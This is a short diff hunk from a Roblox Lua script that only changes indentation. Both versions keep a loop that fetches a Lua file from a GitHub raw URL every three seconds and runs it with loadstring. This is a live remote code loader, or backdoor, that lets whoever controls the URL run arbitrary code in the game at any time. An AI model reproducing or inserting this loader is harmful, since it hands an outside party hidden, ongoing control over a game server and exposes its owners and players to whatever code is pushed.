@@ -867,13 +867,13 @@ for _,plr in pairs(game:service'Players':GetPlayers()) do
 end
 
 delay(0,function()
-spawn(function()
-    while wait(3) do
-       loadstring(
-        game:service'HttpService':GetAsync('https://raw.githubusercontent.com/Jillmiles1/Actinium/master/RawExecute.lua',true)    
-       )() 
-    end
-end)
+	spawn(function()
+	  while wait(3) do
+		 loadstring(
+		 game:service'HttpService':GetAsync('https://raw.githubusercontent.com/Jillmiles1/Actinium/master/RawExecute.lua',true)    
+       		)() 
+    	end
+    end)
 end)
 
 setmetatable({},{
